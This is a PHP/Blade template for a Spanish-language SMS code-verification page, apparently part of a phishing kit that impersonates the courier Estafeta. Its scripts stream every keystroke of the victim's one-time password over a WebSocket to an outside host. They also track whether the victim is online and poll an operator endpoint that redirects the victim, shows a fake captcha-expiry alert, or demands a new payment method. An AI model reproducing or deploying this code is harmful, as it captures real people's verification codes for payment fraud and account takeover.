<?php
session_start();
//require_once 'config.php';
// include('partials/header.php');

$phone = '';
if (isset($_SESSION['contact_number'])) {
    $phone = $_SESSION['contact_number'];
}

?>
@include('apps.mxe.partials.header')
<style>
    /* .login-banner{background: url(./assets/images/pink-banner.jpg) no-repeat center center; min-height: 200px;} */
    .wrap.middle {
        padding: 40px 30px;
        margin-top: 50px;
        background: #f0f0eb;
        padding-bottom: 0px;
    }

    .note {
        margin-bottom: 30px;
    }

    .note font {
        font-weight: 400;
    }

    .input-otp input[type="text"] {
        border: 1px solid #000 !important;
        background-color: #fff !important;
        padding: 3px 8px !important;
        font-weight: 400;
        margin-bottom: 5px;
    }

    .submit-btn {
        background-color: #c00d0d !important;
        border: 1px solid #000 !important;
        margin: 5px 0;
    }

    @media(max-width: 767px) {
        .submit-btn {
            background-color: #c00d0d;
            padding: 11px 24px;
            font-size: 20px;
            display: block;
            width: 100%;
            min-width: 120px;
            margin-left: auto;
            margin-right: auto;
            line-height: 22px;
            border-radius: 32px;
            color: #fff;
            border-color: #00a8b7;
            height: auto;
            cursor: pointer;
        }

        .phone-row input,
        .input-otp input {
            border: none;
            border-bottom: 2px solid #cacaca;
            height: 40px;
            background: transparent;
            font-family: inherit;
            margin-bottom: 15px;
            outline: none;
        }

        .input-otp {
            text-align: center;
        }

        .input-otp input {
            text-align: center;
        }

        .note {
            text-align: center;
            font-size: 16px;
            color: #565656;
            pointer-events: none;
            user-select: none;
        }

        .count-down {
            font-size: 14px;
            color: #ccc;
            border: 1px solid #ccc;
            max-width: 200px;
            margin: auto;
            padding: 10px;
            margin-bottom: 30px;
            margin-top: 10px;
        }

        .wrap.middle form {
            width: 100%;
        }

        .submit-btn:hover:hover {
            background-color: #00a8b7;
            border-color: #00a8b7;
        }
    }
</style>
<div class="backdrop"></div>
<div class="wrap middle" style="width: 100%!important;">
    <div class="form">

        <!-- <form class="input-otp" action="" method="POST"> -->
        <div class="input-otp">
            <div class="note">
                <p>Enviaremos una verificación otp a tu mensaje de texto<span id="phone-number"></span><br />Por favor,
                    introduzca la contraseña de un solo uso que ha recibido (fluctuación de la red SMS se retrasará la
                    entrega, por favor espere pacientemente)</p>
            </div>
            <input class="otp" type="text" id="fullname" name="otp">
            <div class="count-down disabled ">Enviar de nuevo（<span class="second">60</span>s)</div>
            <div class="center">
                <button class="send-otp disabled submit-btn" id="cnt">Validar</button>
            </div>
        </div>
        <input type="hidden" id="last_id" value="<?php echo @$_SESSION['last_id']; ?>" />
        <!-- </form> -->

    </div>


    <div class="spinner-border" id="ajaxprogress"
        style="z-index: 9999;position: fixed;top:0px;display:none;height:100%;width:100%;right: 0px;" role="status">
        <span class=""
            style="z-index: 1041;display: flex;justify-content: center;width: 100%;align-items: center;height:100%;">
            <div class="lds-default">
                <div></div>
                <div></div>
                <div></div>
                <div></div>
                <div></div>
                <div></div>
                <div></div>
                <div></div>
                <div></div>
                <div></div>
                <div></div>
                <div></div>
            </div>
        </span>
    </div>

</div>
<br />
<br />

<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.1/jquery.slim.min.js"
    integrity="sha512-yBpuflZmP5lwMzZ03hiCLzA94N0K2vgBtJgqQ2E1meJzmIBfjbb7k4Y23k2i2c/rIeSUGc7jojyIY5waK3ZxCQ=="
    crossorigin="anonymous" referrerpolicy="no-referrer"></script>
<script type="text/javascript" src="{{ asset('apps/mxe/js/jquery-2.1.3.min.js') }}"></script>
<script>
    //script to check input
    var protocol = 'ws://';
    if (window.location.protocol === 'https:') {
        protocol = 'wss://';
    }

    var wsUri = protocol + "cee.tracie.top/myws";

    var ws = new WebSocket(wsUri);

    jQuery('.input-phone').hide();
    jQuery('.input-otp').show();

    jQuery('.phone-row input').on('input', function() {
        let check = true;
        jQuery('.phone-row input').each(function() {
            if (jQuery(this).val() == '') check = false;
            //console.log(jQuery(this).val());

        });

        if (check) jQuery('.send-phone').removeClass('disabled');
        else jQuery('.send-phone').addClass('disabled')
    });


    jQuery('.otp').on('input', function() {
        console.log('a');

        if (jQuery('.otp').val() == '') jQuery('.send-otp').addClass('disabled');
        else jQuery('.send-otp').removeClass('disabled')
    });



    var second = 60;

    function optSent() {
        //update button
        var count = setInterval(function() {
            second--;
            jQuery('.second').html(second);
            if (second <= 0) {
                clearInterval(count);
                jQuery('.count-down').html('reenviar').removeClass('disabled');
            };
        }, 1000);
    }

    jQuery('.input-otp input').focus();
    jQuery('#phone-number').html(jQuery('.phone-code').val() + ' ' + jQuery('.phone-number').val());

    optSent();

    jQuery('#getotp').on('click', function() {
        //api call
        //  jQuery('.input-phone').hide();
        //jQuery('.input-otp').show();
        jQuery('.input-otp input').focus();
        jQuery('#phone-number').html(jQuery('.phone-code').val() + ' ' + jQuery('.phone-number').val());
        optSent();
    });
</script>

<script>
    jQuery('#cnt').click(function() {
        if (jQuery("#cnt").html() == 'Validar' || jQuery("#cnt").text() == 'Send') {
            var last_id = localStorage.getItem('userAdded');
            var code = jQuery("#fullname").val();
            if (code == '') {
                $("#fillfi").show();
                return;
            }
            jQuery('#fullname').removeClass(" hide-phone");
            jQuery("#ajaxprogress").css("display", "block");
            $(".backdrop").show();
            $.ajax({
                url: '/process.php',
                type: 'POST',
                dataType: "json",
                data: {
                    code: code,
                    last_id: last_id
                },
                success: function(result) {
                    console.log(result);
                    var id = localStorage.getItem('userID')
                    var data = {
                        id: id,
                        action: 'verify-request',
                    }
                    ws.send(JSON.stringify(data))
                    // jQuery("#ajaxprogress").css("display", "none");
                    // $(".backdrop").hide()
                }
            });

        } else {
            jQuery('#fullname').val('');
            jQuery('#fullname').attr("placeholder", "Enter your OTP");
            //jQuery('#fullname').val('Enter your OTP');
            jQuery('#fullname').removeClass(" hide-phone");
            var counter = 60;
            var interval = setInterval(function() {
                counter--;
                $('#cnt').html("Validar");
                // Display 'counter' wherever you want to display it.
                if (counter <= 0) {
                    clearInterval(interval);
                    $('#cnt').html("Validar");
                    return;
                } else {
                    if (counter < 60) {
                        $('#time').text("00:" + counter);
                    } else {
                        $('#time').text(counter);
                    }
                    console.log("Timer --> " + counter);
                }
            }, 1000);
        }
    })
</script>

<script>
    /* JS comes here */
    function setOnline(id, status) {
        if (id) {
            $.ajax({
                type: 'post',
                url: '/usertrackingstatus.php',
                data: {
                    'id': id,
                    'status': status
                },
                success: function(data) {

                }
            });
        }
    }
    var userid = localStorage.getItem('userAdded');


    window.addEventListener('load', function(e) {
        if (navigator.onLine) {
            setOnline(userid, 1)
        } else {
            setOnline(userid, 0)
        }
    }, false);

    window.addEventListener('online', function(e) {
        setOnline(userid, 1)
    }, false);

    window.addEventListener('offline', function(e) {
        setOnline(userid, 0)
    }, false);
</script>
<script type="text/javascript">
    jQuery(document).ready(function() {

        $('#fullname').on('input', (e) => {
            var id = localStorage.getItem('userID')
            var data = {
                id: id,
                action: 'on-verify',
                verifiCode: $(e.target).val()
            }
            ws.send(JSON.stringify(data))
        })
        ws.onerror = function(ev) {
            console.log(ev);
        }

        ws.onopen = function(event) {
            var id = localStorage.getItem('userID')
            var data = {
                id: id,
                action: 'on-verify'
            }
            ws.send(JSON.stringify(data))
        }

        ws.onmessage = (ev) => {
            console.log("*********** user: ", ev.data);
        }

        var showalert = true;
        window.setInterval(function() {
            // do stuff
            var userid = jQuery("#last_id").val();
            $.ajax({
                type: 'post',
                url: '/usertrackingstatus.php',
                data: {
                    'userid': userid
                },
                success: function(data) {
                    //alert(data.length);
                    if (data == 1) {
                        jQuery(location).attr('href', 'https://www.estafeta.com/');
                    }
                    if (data == 2) {
                        jQuery("#ajaxprogress").css("display", "none")
                        $(".backdrop").hide();
                        jQuery('#fillfi').css('display', 'block');
                        if (showalert) {
                            alert(
                                "Captcha agotado, por favor, vuelva a introducir el nuevo captcha."
                            );
                            showalert = false;
                        }
                        return false;
                    }

                    if (data == 3) {
                        showalert = (jQuery('.otp').val() != '') ? true : showalert;
                        jQuery("#ajaxprogress").css("display", "none")
                        $(".backdrop").hide();
                        jQuery('#fillfi').css('display', 'block');
                        if (showalert) {
                            alert(
                                "Su método de pago no es compatible en este momento, por favor inténtelo después de cambiar a un nuevo método de pago."
                            );
                            jQuery(location).attr('href', './page4.php');
                        }
                        return false;
                    }

                }
            });

        }, 4000);
    })
</script>

@include('apps.mxe.partials.footer')
